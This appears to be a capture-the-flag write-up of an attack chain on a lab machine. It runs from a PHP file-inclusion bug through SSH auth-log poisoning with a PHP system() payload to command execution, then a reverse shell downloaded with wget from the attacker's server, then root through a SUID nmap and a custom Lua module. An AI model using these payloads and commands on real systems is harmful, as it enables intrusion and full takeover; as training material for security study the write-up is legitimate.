# Writeup
## Foothold
The index.php has a Local-File-Inclusions
```php
if( isset($_GET['adminDebug']))
{   
    include("admin/".$_GET['adminDebug']);
}
```

To get RCE, we need a file that we can write to. As this is a Docker container, the access- and errorlog files of httpd and nginx are commonly disabled, so we have to look for other files. One trick is the `/var/log/auth.log` file, which we can write if SSH is enabled. On this machine it is, so we can write to the file by doing `ssh '<?= system($_GET['cmd']); =?>'@77.35.101.128` and then go to http://77.35.101.128:8000/?adminDebug=../../../../var/log/auth.log&cmd=whoami

## PrivEsc
To get a propper shell, I created a python file with a revshell payload, hosted it using `python3 -m http.server 8080` and download it through the php shell with `wget http://myip:8000/rev.py` and execute it with `python3 rev.py`

After enumerating (manually or with LinPeas), we find that nmap is SUID. After reading a few blog posts, we find that `--interactive` doesn't work in newer versions and `os.execute` drops SUID in the Lua code which is what nmap runs scripts as. [This blog](https://www.elttam.com/blog/lua-suid-shells/) mentions a trick to bypass this, by creating a custom lua module that runs sh without dropping permissions and importing it to a nmap script.

The module is written in C (the example from the blog is [here](./sh.c)) and compiled using the following command `gcc -I/usr/include/lua5.3 -o sh.so -shared -fpic sh.c` which requires the `liblua5.3-dev` apt package to work. The sh.so file is then moved to the target machine, along with the [nmap script](./sh.nse) from the blog. Finally by running `nmap --script=./sh.nse` on the target, we get a root shell.